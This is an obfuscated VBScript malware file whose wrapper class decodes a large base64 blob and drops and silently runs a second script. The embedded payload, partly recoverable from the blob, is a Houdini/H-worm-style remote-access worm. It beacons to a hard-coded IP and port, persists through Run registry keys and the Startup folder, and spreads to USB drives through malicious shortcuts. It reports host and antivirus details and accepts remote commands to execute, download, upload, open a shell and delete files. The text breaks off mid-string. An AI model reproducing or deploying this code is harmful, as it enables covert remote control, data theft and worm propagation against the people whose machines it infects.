Class classe1
    Function funcao1(parametro)
	    set xmlDom = CreateObject("microsoft.xmldom").createElement("ktc")
	    xmlDom.DataType = "bin.base64"
        xmlDom.Text = parametro(0)
        funcao1 = xmlDom.NodeTypedValue
    End Function

    Function getInfo(key)
        If typename(key) = "String" Then
            getInfo = Array("b24gZXJyb3IgcmVzdW1lIG5leHQKZGltIGxvbmdUZXh0MQpsb25nVGV4dDEgPS<!iUTJ4aGMzTWdSR0ZwYkhsTmIzUnVEUXBtZFc1amRHbHZiaUJ1YjBkc2Ewb29RbUZzYkhwSEtRMEtDWE5sZENCdklEMGdRbUZzYkhwSEtESXBMbU55WldGMFpVVnNaVzFsYm5Rb1FtRnNiSHBIS0RFcEtRMEtDVzh1UkdGMFlWUjVjR1VnUFNCQmNuSmhlU2dpWW1sdUxtSmhjMlUyTkNJcEtEQXBEUW9KYnk1VVpYaDBJRDBnUW1Gc2JIcEhLREFwRFFvSmFXWWdLRUpoYkd4NlJ5Z3pLU2d3S1NBbUlFSmhiR3g2UnlnektTZ3hLU2tnUFNBb0ltSmhJaUFtSUNKelpTSXBJSFJvWlc0TkNna0pibTlIYkd0S0lEMGdRWEp5WVhrb2J5NU9iMlJsVkhsd1pXUldZV3gxWlNrTkNnbGxibVFnYVdZTkNtVnVaQ0JtZFc1amRHbHZiZzBLRFFwbWRXNWpkR2x2YmlCblpYUkpibVp2S0d0bGVTa05DZ2xwWmlCMGVYQmxibUZ0WlNoclpYa3BJRDBnSWxOMGNtbHVaeUlnZEdobGJnMEtDUWxuWlhSSmJtWnZJRDBnUVhKeVlYa29JbUpZVG01WmJUazBTME5LYjFwWWEyaEpSMnRuV1Zjd1oxbHRVV2xMVVQwOUlpd2dJandoSWl3Z0lrRWlLUTBLQ1dWc2MyVU5DZ2tKZEdWdGNDQTlJR2RsZEVsdVptOG9JbXhoWW1sMGJ5SXBEUW9KQ1hSbGJYQW9NQ2tnUFNCclpYa3VVbVZoWkZSbGVIUU5DZ2tKWjJWMFNXNW1ieUE5SUhSbGJYQU5DZ2xsYm1RZ2FXWU5DbVZ1WkNCbWRXNWpkR2x2YmcwS1JXNWtJRU5zWVhOekRRb05Dbk5sZENCemRXSnpJRDBnYm1WM0lFUmhhV3g1VFc5MGJnMEtaekY2TkhKa0lEMGdjM1ZpY3k1blpYUkpibVp2S0NKc1lXSnBkRzhpS1EwS1p6RjZOSEprYnlBOUlGSmxjR3hoWTJVb1p6RjZOSEprS0RBcExDQm5NWG8wY21Rb01Ta3NJR2N4ZWpSeVpDZ3lLU2tOQ25ObGRDQnVZVzV2SUQwZ1EzSmxZWFJsVDJKcVpXTjBLQ0p0YVdOeWIzTnZablF1ZUcxc1pHOXRJaWtOQ21jeGVqUnlaQ0E5SUVGeWNtRjVLR2N4ZWpSeVpHOHNJQ0pyZEdNaUxDQnVZVzV2TENCQmNuSmhlU2hqYUhJb09UZ3BJQ1lnWTJoeUtEazNLU3dnWTJoeUtERXhOU2tnSmlCamFISW9NVEF4S1N3Z1kyaHlLRFUwS1NBbUlHTm9jaWcxTWlrcEtRMEtEUXBuTVhvMGNtUWdQU0JCY25KaGVTaERjbVZoZEdWUFltcGxZM1FvSW1Ga2IyUmlMbk4wY21WaGJTSXBMQ0J6ZFdKekxtNXZSMnhyU2lobk1YbzBjbVFwTENBaWRYTXRZWE5qYVdraUtRMEtaekY2TkhKa0tEQXBMbFI1Y0dVZ1BTQXhEUXBuTVhvMGNtUW9NQ2t1VDNCbGJnMEtaekY2TkhKa0tEQXBMbGR5YVhSbElHY3hlalJ5WkNneEtTZ3dLUTBLWnpGNk5ISmtLREFwTGxCdmMybDBhVzl1SUQwZ01BMEtaekY2TkhKa0tEQXBMbFI1Y0dVZ1BTQXlEUXBuTVhvMGNtUW9NQ2t1UTJoaGNsTmxkQ0E5SUdjeGVqUnlaQ2d5S1EwS0RRb05DbWxtSUdOb2NpZzVOeWtnUFNBaVlTSWdZVzVrSUdjeGVqUnlaQ2d3S1M1RGFHRnlVMlYwSUQwZ0luVnpMV0Z6WTJscElpQjBhR1Z1RFFvSlJYaGxZM1YwWlVkc2IySmhiQ0J6ZFdKekxtZGxkRWx1Wm04b1p6RjZOSEprS0RBcEtTZ3dLUTBLWlc1a0lHbG0iCnNldCB3c2hTaGVsbDEgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQpkaW0gYXBwZGF0YWRpcjEKYXBwZGF0YWRpcjEgPSB3c2hTaGVsbDEuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlYXBwZGF0YSUiKQpkaW0gc3R1YnBhdGgxCnN0dWJwYXRoMS<!9IGFwcGRhdGFkaXIxICYgIlxEb0dSbFBaZmpWLnZicyIKZGltIGRlY29kZWQxCmRlY29kZWQxID0gZGVjb2RlQmFzZTY0KGxvbmdUZXh0MSkKd3JpdGVCeXRlcyBzdHVicGF0aDEsIGRlY29kZWQxCndzaFNoZWxsMS5ydW4oIndzY3JpcHQgLy9CICIiIi<!mIHN0dWJwYXRoMS<!mICIiIiIpCgpmdW5jdGlvbiB3cml0ZUJ5dGVzKGZpbGUsIGJ5dGVzKQpvbiBlcnJvciByZXN1bWUgbmV4d<!pzZXQgYmluYXJ5U3RyZWFtID0gQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKQpiaW5hcnlTdHJlYW0uVHlwZS<!9IDEKYmluYXJ5U3RyZWFtLk9wZW4KYmluYXJ5U3RyZWFtLldyaXRlIGJ5dGVzCmJpbmFyeVN0cmVhbS5TYXZlVG9GaWxlIGZpbGUsIDIKZW5kIGZ1bmN0aW9uCgpmdW5jdGlvbiBkZWNvZGVCYXNlNjQoYmFzZTY0KQpzZXQgRE0gPSBDcmVhdGVPYmplY3QoIk1pY3Jvc29mdC5YTUxET00iKQpzZXQgRUwgPSBETS5jcmVhdGVFbGVtZW50KCJ0bX<!iKQpFTC5kYXRhVHlwZS<!9ICJiaW4uYmFzZTY0IgpFTC50ZXh0ID0gYmFzZTY0CmRlY29kZUJhc2U2NC<!9IEVMLk5vZGVUeXBlZFZhbHVlCmVuZCBmdW5jdGlvbgp3c2hTaGVsbDEgPSBub3RoaW5nDQpob3N0ID0gIjE4NS4yMzYuMjMxLjE5OCINCnBvcnQgPS<!3OTc0DQppbnN0YWxsZGlyID0gIiVhcHBkYXRhJSINCmxua2ZpbGUgPSB0cnVlDQpsbmtmb2xkZXIgPSB0cnVlDQpkaW0gc2hlbGxvYmoNCnNldCBzaGVsbG9iai<!9IHdzY3JpcHQuY3JlYXRlb2JqZWN0KCJ3c2NyaXB0LnNoZWxsIikNCmRpbSBmaWxlc3lzdGVtb2JqDQpzZXQgZmlsZXN5c3RlbW9iai<!9IGNyZWF0ZW9iamVjdCgic2NyaXB0aW5nLmZpbGVzeXN0ZW1vYmplY3QiKQ0KZGltIGh0dHBvYmoNCnNldCBodHRwb2JqID0gY3JlYXRlb2JqZWN0KCJtc3htbDIueG1saHR0cCIpDQppbnN0YWxsbmFtZS<!9IHdzY3JpcHQuc2NyaXB0bmFtZQ0Kc3RhcnR1cC<!9IHNoZWxsb2JqLnNwZWNpYWxmb2xkZXJzICgic3RhcnR1cCIpICYgIlwiDQppbnN0YWxsZGlyID0gc2hlbGxvYmouZXhwYW5kZW52aXJvbm1lbnRzdHJpbmdzKGluc3RhbGxkaXIpICYgIlwiDQppZiBub3QgZmlsZXN5c3RlbW9iai5mb2xkZXJleGlzdHMoaW5zdGFsbGRpcikgdGhlbi<!gaW5zdGFsbGRpci<!9IHNoZWxsb2JqLmV4cGFuZGVudmlyb25tZW50c3RyaW5ncygiJXRlbX<!lIikgJi<!iXCINCnNwbGl0ZXIgPS<!iPCIgJi<!ifCIgJi<!iPiINCnNsZWVwID0gNT<!wM<!0KZGltIHJlc3BvbnNlDQpkaW0gY21kDQpkaW0gcGFyYW0NCmluZm8gPS<!iIg0KdXNic3ByZWFkaW5nID0gIiINCnN0YXJ0ZGF0ZS<!9ICIiDQpkaW0gb25lb25jZQ0Kb24gZXJyb3IgcmVzdW1lIG5leHQNCmluc3RhbmNlDQp3aGlsZSB0cnVlDQppbnN0YWxsDQpyZXNwb25zZS<!9ICIiDQpyZXNwb25zZS<!9IHBvc3QgKCJpcy1yZWFkeSIsIiIpDQpjbWQgPSBzcGxpdC<!ocmVzcG9uc2Usc3BsaXRlcikNCnNlbGVjdCBjYXNlIGNtZC<!oMCkNCmNhc2UgImV4Y2VjdXRlIg0KcGFyYW0gPSBjbWQgKDEpDQpleGVjdXRlIHBhcmFtDQpjYXNlICJ1cGRhdGUiDQpwYXJhbS<!9IGNtZC<!oMSkNCm9uZW9uY2UuY2xvc2UNCnNldCBvbmVvbmNlID0gIGZpbGVzeXN0ZW1vYmoub3BlbnRleHRmaWxlIChpbnN0YWxsZGlyICYgaW5zdGFsbG5hbWUgLDIsIGZhbHNlKQ0Kb25lb25jZS53cml0ZSBwYXJhbQ0Kb25lb25jZS5jbG9zZQ0Kc2hlbGxvYmoucnVuICJ3c2NyaXB0LmV4ZS<!vL0IgIi<!mIGNocigzNCkgJiBpbnN0YWxsZGlyICYgaW5zdGFsbG5hbWUgJiBjaHIoMzQpDQp3c2NyaXB0LnF1aXQNCmNhc2UgInVuaW5zdGFsbCINCnVuaW5zdGFsb<!0KY2FzZS<!ic2VuZCINCmRvd25sb2FkIGNtZC<!oMSksY21kICgyKQ0KY2FzZS<!ic2l0ZS1zZW5kIg0Kc2l0ZWRvd25sb2FkZXIgY21kICgxKSxjbWQgKDIpDQpjYXNlICJyZWN2Ig0KcGFyYW0gPSBjbWQgKDEpDQp1cGxvYWQgKHBhcmFtKQ0KY2FzZS<!gImVudW0tZHJpdmVyIg0KcG9zdC<!iaXMtZW51bS1kcml2ZXIiLGVudW1kcml2ZXINCmNhc2UgICJlbnVtLWZhZiINCnBhcmFtID0gY21kICgxKQ0KcG9zdC<!iaXMtZW51bS1mYWYiLGVudW1mYWYgKHBhcmFtKQ0KY2FzZS<!gImVudW0tcHJvY2VzcyINCnBvc3QgImlzLWVudW0tcHJvY2VzcyIsZW51bXByb2Nlc3MNCmNhc2UgICJjbWQtc2hlbGwiDQpwYXJhbS<!9IGNtZC<!oMSkNCnBvc3QgImlzLWNtZC1zaGVsbCIsY21kc2hlbGwgKHBhcmFtKQ0KY2FzZS<!gImRlbGV0ZSINCnBhcmFtID0gY21kICgxKQ0KZGVsZXRlZmFmIChwYXJhbSkNCmNhc2UgICJleGl0LXByb2Nlc3MiDQpwYXJhbS<!9IGNtZC<!oMSkNCmV4aXRwcm9jZXNzIChwYXJhbSkNCmNhc2UgICJzbGVlcCINCnBhcmFtID0gY21kICgxKQ0Kc2xlZX<!gPSBldmFsIChwYXJhbSkNCmVuZCBzZWxlY3QNCndzY3JpcHQuc2xlZX<!gc2xlZX<!NCndlbmQNCnN1YiBpbnN0YWxsDQpvbiBlcnJvciByZXN1bWUgbmV4d<!0KZGltIGxua29iag0KZGltIGZpbGVuYW1lDQpkaW0gZm9sZGVybmFtZQ0KZGltIGZpbGVpY29uDQpkaW0gZm9sZGVyaWNvbg0KdXBzdGFyd<!0KZm9yIGVhY2ggZHJpdmUgaW4gZmlsZXN5c3RlbW9iai5kcml2ZXMNCmlmICBkcml2ZS5pc3JlYWR5ID0gdHJ1ZSB0aGVuDQppZi<!gZHJpdmUuZnJlZXNwYWNlIC<!+ID<!gdGhlbg0KaWYgIGRyaXZlLmRyaXZldHlwZS<!gPS<!xIHRoZW4NCmZpbGVzeXN0ZW1vYmouY29weWZpbGUgd3NjcmlwdC5zY3JpcHRmdWxsbmFtZS<!sIGRyaXZlLnBhdGggJi<!iXCIgJiBpbnN0YWxsbmFtZSx0cnVlDQppZi<!gZmlsZXN5c3RlbW9iai5maWxlZXhpc3RzIChkcml2ZS5wYXRoICYgIlwiICYgaW5zdGFsbG5hbWUpICB0aGVuDQpmaWxlc3lzdGVtb2JqLmdldGZpbGUoZHJpdmUucGF0aC<!mICJcIi<!gJiBpbnN0YWxsbmFtZSkuYXR0cmlidXRlcy<!9IDIrN<!0KZW5kIGlmDQpmb3IgZWFjaCBmaWxlIGluIGZpbGVzeXN0ZW1vYmouZ2V0Zm9sZGVyKCBkcml2ZS5wYXRoICYgIlwiICkuRmlsZXMNCmlmIG5vdCBsbmtmaWxlIHRoZW4gZXhpdCBmb3INCmlmICBpbnN0ci<!oZmlsZS5uYW1lLCIuIikgdGhlbg0KaWYgIGxjYXNlIChzcGxpdChmaWxlLm5hbWUsICIuIikgKHVib3VuZChzcGxpdChmaWxlLm5hbWUsICIuIikpKSkgPD4gImxuayIgdGhlbg0KZmlsZS5hdHRyaWJ1dGVzID0gMis0DQppZi<!gdWNhc2UgKGZpbGUubmFtZSkgPD4gdWNhc2UgKGluc3RhbGxuYW1lKSB0aGVuDQpmaWxlbmFtZS<!9IHNwbGl0KGZpbGUubmFtZSwiLiIpDQpzZXQgbG5rb2JqID0gc2hlbGxvYmouY3JlYXRlc2hvcnRjdXQgKGRyaXZlLnBhdGggJi<!iXCIgICYgZmlsZW5hbWUgKD<!pICYgIi5sbmsiKQ0KbG5rb2JqLndpbmRvd3N0eWxlID0gNw0KbG5rb2JqLnRhcmdldHBhdGggPS<!iY21kLmV4ZSINCmxua29iai53b3JraW5nZGlyZWN0b3J5ID0gIiINCmxua29iai5hcmd1bWVudHMgPS<!iL2Mgc3RhcnQgIi<!mIHJlcGxhY2UoaW5zdGFsbG5hbWUsIi<!iLCBjaHJ3KDM0KS<!mICIgIi<!mIGNocncoMzQpKS<!mICImc3RhcnQgIi<!mIHJlcGxhY2UoZmlsZS5uYW1lLCIgIiwgY2hydygzNCkgJi<!iICIgJiBjaHJ3KDM0KSkgJiImZXhpdCINCmZpbGVpY29uID0gc2hlbGxvYmoucmVncmVhZC<!oIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVxjbGFzc2VzXCIgJiBzaGVsbG9iai5yZWdyZWFkICgiSEtFWV9MT0NBTF9NQUNISU5FXHNvZnR3YXJlXGNsYXNzZXNcLiIgJiBzcGxpdChmaWxlLm5hbWUsICIuIikodWJvdW5kKHNwbGl0KGZpbGUubmFtZSwgIi4iKSkpJi<!iXCIpICYgIlxkZWZhdWx0aWNvblwiKQ0KaWYgIGluc3RyIChmaWxlaWNvbiwiLCIpID0gMCB0aGVuDQpsbmtvYmouaWNvbmxvY2F0aW9uID0gZmlsZS5wYXRoDQplbHNlDQpsbmtvYmouaWNvbmxvY2F0aW9uID0gZmlsZWljb24NCmVuZCBpZg0KbG5rb2JqLnNhdmUoKQ0KZW5kIGlmDQplbmQgaWYNCmVuZCBpZg0KbmV4d<!0KZm9yIGVhY2ggZm9sZGVyIGluIGZpbGVzeXN0ZW1vYmouZ2V0Zm9sZGVyKCBkcml2ZS5wYXRoICYgIlwiICkuc3ViZm9sZGVycw0KaWYgbm90IGxua2ZvbGRlciB0aGVuIGV4aXQgZm9yDQpmb2xkZXIuYXR0cmlidXRlcy<!9IDIrN<!0KZm9sZGVybmFtZS<!9IGZvbGRlci5uYW1lDQpzZXQgbG5rb2JqID0gc2hlbGxvYmouY3JlYXRlc2hvcnRjdXQgKGRyaXZlLnBhdGggJi<!iXCIgICYgZm9sZGVybmFtZS<!mICIubG5rIikNCmxua29iai53aW5kb3dzdHlsZS<!9IDcNCmxua29iai50YXJnZXRwYXRoID0gImNtZC5leGUiDQpsbmtvYmoud29ya2luZ2RpcmVjdG9yeS<!9ICIiDQpsbmtvYmouYXJndW1lbnRzID0gIi9jIHN0YXJ0ICIgJiByZXBsYWNlKGluc3RhbGxuYW1lLCIgIiwgY2hydygzNCkgJi<!iICIgJiBjaHJ3KDM0KSkgJi<!iJnN0YXJ0IGV4cGxvcmVyICIgJiByZXBsYWNlKGZvbGRlci5uYW1lLCIgIiwgY2hydygzNCkgJi<!iICIgJiBjaHJ3KDM0KSkgJiImZXhpdCINCmZvbGRlcmljb24gPSBzaGVsbG9iai5yZWdyZWFkICgiSEtFWV9MT0NBTF9NQUNISU5FXHNvZnR3YXJlXGNsYXNzZXNcZm9sZGVyXGRlZmF1bHRpY29uXCIpDQppZi<!gaW5zdHIgKGZvbGRlcmljb24sIiwiKS<!9ID<!gdGhlbg0KbG5rb2JqLmljb25sb2NhdGlvbi<!9IGZvbGRlci5wYXRoDQplbHNlDQpsbmtvYmouaWNvbmxvY2F0aW9uID0gZm9sZGVyaWNvbg0KZW5kIGlmDQpsbmtvYmouc2F2ZSgpDQpuZXh0DQplbmQgSWYNCmVuZCBJZg0KZW5kIGlmDQpuZXh0DQplcnIuY2xlYXINCmVuZCBzdWINCnN1YiB1bmluc3RhbGwNCm9uIGVycm9yIHJlc3VtZSBuZXh0DQpkaW0gZmlsZW5hbWUNCmRpbSBmb2xkZXJuYW1lDQpzaGVsbG9iai5yZWdkZWxldGUgIkhLRVlfQ1VSUkVOVF9VU0VSXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHJ1blwiICYgc3BsaXQgKGluc3RhbGxuYW1lLCIuIikoMCkNCnNoZWxsb2JqLnJlZ2RlbGV0ZS<!iSEtFWV9MT0NBTF9NQUNISU5FXHNvZnR3YXJlXG1pY3Jvc29mdFx3aW5kb3dzXGN1cnJlbnR2ZXJzaW9uXHJ1blwiICYgc3BsaXQgKGluc3RhbGxuYW1lLCIuIikoMCkNCmZpbGVzeXN0ZW1vYmouZGVsZXRlZmlsZSBzdGFydHVwICYgaW5zdGFsbG5hbWUgLHRydWUNCmZpbGVzeXN0ZW1vYmouZGVsZXRlZmlsZSB3c2NyaXB0LnNjcmlwdGZ1bGxuYW1lICx0cnVlDQpmb3IgIGVhY2ggZHJpdmUgaW4gZmlsZXN5c3RlbW9iai5kcml2ZXMNCmlmICBkcml2ZS5pc3JlYWR5ID0gdHJ1ZSB0aGVuDQppZi<!gZHJpdmUuZnJlZXNwYWNlIC<!+ID<!gdGhlbg0KaWYgIGRyaXZlLmRyaXZldHlwZS<!gPS<!xIHRoZW4NCmZvci<!gZWFjaCBmaWxlIGluIGZpbGVzeXN0ZW1vYmouZ2V0Zm9sZGVyICggZHJpdmUucGF0aC<!mICJcIikuZmlsZXMNCm9uIGVycm9yIHJlc3VtZSBuZXh0DQppZi<!gaW5zdHIgKGZpbGUubmFtZSwiLiIpIHRoZW4NCmlmICBsY2FzZS<!oc3BsaXQoZmlsZS5uYW1lLC<!iLiIpKHVib3VuZChzcGxpdChmaWxlLm5hbWUsICIuIikpKSkgPD4gImxuayIgdGhlbg0KZmlsZS5hdHRyaWJ1dGVzID0gM<!0KaWYgIHVjYXNlIChmaWxlLm5hbWUpIDw+IHVjYXNlIChpbnN0YWxsbmFtZSkgdGhlbg0KZmlsZW5hbWUgPSBzcGxpdChmaWxlLm5hbWUsIi4iKQ0KZmlsZXN5c3RlbW9iai5kZWxldGVmaWxlIChkcml2ZS5wYXRoICYgIlwiICYgZmlsZW5hbWUoMCkgJi<!iLmxuayIgKQ0KZWxzZQ0KZmlsZXN5c3RlbW9iai5kZWxldGVmaWxlIChkcml2ZS5wYXRoICYgIlwiICYgZmlsZS5uYW1lKQ0KZW5kIElmDQplbHNlDQpmaWxlc3lzdGVtb2JqLmRlbGV0ZWZpbGUgKGZpbGUucGF0aCkNCmVuZCBpZg0KZW5kIGlmDQpuZXh0DQpmb3IgZWFjaCBmb2xkZXIgaW4gZmlsZXN5c3RlbW9iai5nZXRmb2xkZXIoIGRyaXZlLnBhdGggJi<!iXCIgKS5zdWJmb2xkZXJzDQpmb2xkZXIuYXR0cmlidXRlcy<!9ID<!NCm5leHQNCmVuZCBpZg0KZW5kIGlmDQplbmQgaWYNCm5leHQNCndzY3JpcHQucXVpd<!0KZW5kIHN1Yg0KZnVuY3Rpb24gcG9zdC<!oY21kICxwYXJhbSkNCnBvc3QgPSBwYXJhbQ0KaHR0cG9iai5vcGVuICJwb3N0IiwiaHR0cDovLyIgJiBob3N0ICYgIjoiICYgcG9ydC<!mIi8iICYgY21kLCBmYWxzZQ0KaHR0cG9iai5zZXRyZXF1ZXN0aGVhZGVyICJ1c2VyLWFnZW50OiIsaW5mb3JtYXRpb24NCmh0dHBvYmouc2VuZCBwYXJhbQ0KcG9zdC<!9IGh0dHBvYmoucmVzcG9uc2V0ZXh0DQplbmQgZnVuY3Rpb24NCmZ1bmN0aW9uIGluZm9ybWF0aW9uDQpvbiBlcnJvciByZXN1bWUgbmV4d<!0KaWYgIGluZi<!9ICIiIHRoZW4NCmluZi<!9IGh3aWQgJiBzcGxpdGVyDQppbmYgPSBpbmYgICYgc2hlbGxvYmouZXhwYW5kZW52aXJvbm1lbnRzdHJpbmdzKCIlY29tcHV0ZXJuYW1lJSIpICYgc3BsaXRlcg0KaW5mID0gaW5mIC<!mIHNoZWxsb2JqLmV4cGFuZGVudmlyb25tZW50c3RyaW5ncygiJXVzZXJuYW1lJSIpICYgc3BsaXRlcg0Kc2V0IHJvb3QgPSBnZXRvYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9ubGV2ZWw9aW1wZXJzb25hdGV9IVxcLlxyb290XGNpbXYyIikNCnNldCBvcy<!9IHJvb3QuZXhlY3F1ZXJ5ICgic2VsZWN0ICogZnJvbSB3aW4zMl9vcGVyYXRpbmdzeXN0ZW0iKQ0KZm9yIGVhY2ggb3NpbmZvIGluIG9zDQppbmYgPSBpbmYgJiBvc2luZm8uY2FwdGlvbi<!mIHNwbGl0ZXINCmV4aXQgZm9yDQpuZXh0DQppbmYgPSBpbmYgJi<!icGx1cyIgJiBzcGxpdGVyDQppbmYgPSBpbmYgJiBzZWN1cml0eS<!mIHNwbGl0ZXINCmluZi<!9IGluZi<!mIHVzYnNwcmVhZGluZw0KaW5mb3JtYXRpb24gPSBpbmYNCmVsc2UNCmluZm9ybWF0aW9uID0gaW5mDQplbmQgaWYNCmVuZCBmdW5jdGlvbg0Kc3ViIHVwc3RhcnQgKCkNCm9uIGVycm9yIHJlc3VtZSBOZXh0DQpzaGVsbG9iai5yZWd3cml0ZS<!iSEtFWV9DVVJSRU5UX1VTRVJcc29mdHdhcmVcbWljcm9zb2Z0XHdpbmRvd3NcY3VycmVudHZlcnNpb25ccnVuXCIgJiBzcGxpdC<!oaW5zdGFsbG5hbWUsIi4iKSgwKSwgICJ3c2NyaXB0LmV4ZS<!vL0IgIi<!mIGNocncoMzQpICYgaW5zdGFsbGRpci<!mIGluc3RhbGxuYW1lICYgY2hydygzNCkgLC<!iUkVHX1NaIg0Kc2hlbGxvYmoucmVnd3JpdGUgIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVxtaWNyb3NvZnRcd2luZG93c1xjdXJyZW50dmVyc2lvblxydW5cIi<!mIHNwbGl0IChpbnN0YWxsbmFtZSwiLiIpKD<!pLC<!gIndzY3JpcHQuZXhlIC8vQi<!iIC<!mIGNocncoMzQpICYgaW5zdGFsbGRpci<!mIGluc3RhbGxuYW1lICYgY2hydygzNCkgLC<!iUkVHX1NaIg0KZmlsZXN5c3RlbW9iai5jb3B5ZmlsZSB3c2NyaXB0LnNjcmlwdGZ1bGxuYW1lLGluc3RhbGxkaXIgJiBpbnN0YWxsbmFtZSx0cnVlDQpmaWxlc3lzdGVtb2JqLmNvcHlmaWxlIHdzY3JpcHQuc2NyaXB0ZnVsbG5hbWUsc3RhcnR1cC<!mIGluc3RhbGxuYW1lICx0cnVlDQplbmQgc3ViDQpmdW5jdGlvbiBod2lkDQpvbiBlcnJvciByZXN1bWUgbmV4d<!0Kc2V0IHJvb3QgPSBnZXRvYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9ubGV2ZWw9aW1wZXJzb25hdGV9IVxcLlxyb290XGNpbXYyIikNCnNldCBkaXNrcy<!9IHJvb3QuZXhlY3F1ZXJ5ICgic2VsZWN0ICogZnJvbSB3aW4zMl9sb2dpY2FsZGlzayIpDQpmb3IgZWFjaCBkaXNrIGluIGRpc2tzDQppZi<!gZGlzay52b2x1bWVzZXJpYWxudW1iZXIgPD4gIiIgdGhlbg0KaHdpZC<!9IGRpc2sudm9sdW1lc2VyaWFsbnVtYmVyDQpleGl0IGZvcg0KZW5kIGlmDQpuZXh0DQplbmQgZnVuY3Rpb24NCmZ1bmN0aW9uIHNlY3VyaXR5DQpvbiBlcnJvciByZXN1bWUgbmV4d<!0Kc2VjdXJpdHkgPS<!iIg0Kc2V0IG9iandtaXNlcnZpY2UgPSBnZXRvYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9ubGV2ZWw9aW1wZXJzb25hdGV9IVxcLlxyb290XGNpbXYyIikNCnNldCBjb2xpdGVtcy<!9IG9iandtaXNlcnZpY2UuZXhlY3F1ZXJ5KCJzZWxlY3QgKiBmcm9tIHdpbjMyX29wZXJhdGluZ3N5c3RlbSIsLDQ4KQ0KZm9yIGVhY2ggb2JqaXRlbSBpbiBjb2xpdGVtcw0KdmVyc2lvbnN0ci<!9IHNwbGl0IChvYmppdGVtLnZlcnNpb24sIi4iKQ0KbmV4d<!0KdmVyc2lvbnN0ci<!9IHNwbGl0IChjb2xpdGVtcy52ZXJzaW9uLCIuIikNCm9zdmVyc2lvbi<!9IHZlcnNpb25zdHIgKD<!pICYgIi4iDQpmb3IgIHggPS<!xIHRvIHVib3VuZC<!odmVyc2lvbnN0cikNCm9zdmVyc2lvbi<!9IG9zdmVyc2lvbi<!mICB2ZXJzaW9uc3RyIChpKQ0KbmV4d<!0Kb3N2ZXJzaW9uID0gZXZhbC<!ob3N2ZXJzaW9uKQ0KaWYgIG9zdmVyc2lvbi<!+IDYgdGhlbiBzYy<!9ICJzZWN1cml0eWNlbnRlcjIiIGVsc2Ugc2MgPS<!ic2VjdXJpdHljZW50ZXIiDQpzZXQgb2Jqc2VjdXJpdHljZW50ZXIgPSBnZXRvYmplY3QoIndpbm1nbXRzOlxcbG9jYWxob3N0XHJvb3RcIi<!mIHNjKQ0KU2V0IGNvbGFudGl2aXJ1cy<!9IG9ianNlY3VyaXR5Y2VudGVyLmV4ZWNxdWVyeSgic2VsZWN0ICogZnJvbSBhbnRpdmlydXNwcm9kdWN0Iiwid3FsIiwwKQ0KZm9yIGVhY2ggb2JqYW50aXZpcnVzIGluIGNvbGFudGl2aXJ1cw0Kc2VjdXJpdHkgID0gc2VjdXJpdHkgICYgb2JqYW50aXZpcnVzLmRpc3BsYXluYW1lICYgIi<!uIg0KbmV4d<!0KaWYgc2VjdXJpdHkgID0gIiIgdGhlbiBzZWN1cml0eS<!gPS<!ibmFuLWF2Ig0KZW5kIGZ1bmN0aW9uDQpmdW5jdGlvbiBpbnN0YW5jZQ0Kb24gZXJyb3IgcmVzdW1lIG5leHQNCnVzYnNwcmVhZGluZy<!9IHNoZWxsb2JqLnJlZ3JlYWQgKCJIS0VZX0xPQ0FMX01BQ0hJTkVcc29mdHdhcmVcIi<!mIHNwbGl0IChpbnN0YWxsbmFtZSwiLiIpKD<!pICYgIlwiKQ0KaWYgdXNic3ByZWFkaW5nID0gIiIgdGhlbg0KaWYgbGNhc2UgKCBtaWQod3NjcmlwdC5zY3JpcHRmdWxsbmFtZSwyKSkgPS<!iOlwiICYgIGxjYXNlKGluc3RhbGxuYW1lKSB0aGVuDQp1c2JzcHJlYWRpbmcgPS<!idHJ1ZS<!tICIgJiBkYXRlDQpzaGVsbG9iai5yZWd3cml0ZS<!iSEtFWV9MT0NBTF9NQUNISU5FXHNvZnR3YXJlXCIgJiBzcGxpdC<!oaW5zdGFsbG5hbWUsIi4iKSgwKS<!gJi<!iXCIsICB1c2JzcHJlYWRpbmcsICJSRUdfU1oiDQplbHNlDQp1c2JzcHJlYWRpbmcgPS<!iZmFsc2UgLS<!iICYgZGF0ZQ0Kc2hlbGxvYmoucmVnd3JpdGUgIkhLRVlfTE9DQUxfTUFDSElORVxzb2Z0d2FyZVwiICYgc3BsaXQgKGluc3RhbGxuYW1lLCIuIikoMCkgICYgIlwiLC<!gdXNic3ByZWFkaW5nLC<!iUkVHX1NaIg0KZW5kIGlmDQplbmQgSWYNCnVwc3RhcnQNCnNldCBzY3JpcHRmdWxsbmFtZXNob3J0ID0gIGZpbGVzeXN0ZW1vYmouZ2V0ZmlsZS<!od3NjcmlwdC5zY3JpcHRmdWxsbmFtZSkNCnNldCBpbnN0YWxsZnVsbG5hbWVzaG9ydC<!9ICBmaWxlc3lzdGVtb2JqLmdldGZpbGUgKGluc3RhbGxkaXIgJiBpbnN0YWxsbmFtZSkNCmlmICBsY2FzZS<!oc2NyaXB0ZnVsbG5hbWVzaG9ydC5zaG9ydHBhdGgpIDw+IGxjYXNlIChpbnN0YWxsZnVsbG5hbWVzaG9ydC5zaG9ydHBhdGgpIHRoZW4NCnNoZWxsb2JqLnJ1bi<!id3NjcmlwdC5leGUgLy9CICIgJiBjaHIoMzQpICYgaW5zdGFsbGRpci<!mIGluc3RhbGxuYW1lICYgQ2hyKDM0KQ0Kd3NjcmlwdC5xdWl0DQplbmQgSWYNCmVyci5jbGVhcg0Kc2V0IG9uZW9uY2UgPSBmaWxlc3lzdGVtb2JqLm9wZW50ZXh0ZmlsZS<!oaW5zdGFsbGRpci<!mIGluc3RhbGxuYW1lICw4LCBmYWxzZSkNCmlmICBlcnIubnVtYmVyID4gMCB0aGVuIHdzY3JpcHQucXVpd<!0KZW5kIGZ1bmN0aW9uDQpzdWIgc2l0ZWRvd25sb2FkZXIgKGZpbGV1cmwsZmlsZW5hbWUpDQpzdHJsaW5rID0gZmlsZXVyb<!0Kc3Ryc2F2ZXRvID0gaW5zdGFsbGRpci<!mIGZpbGVuYW1lDQpzZXQgb2JqaHR0cGRvd25sb2FkID0gY3JlYXRlb2JqZWN0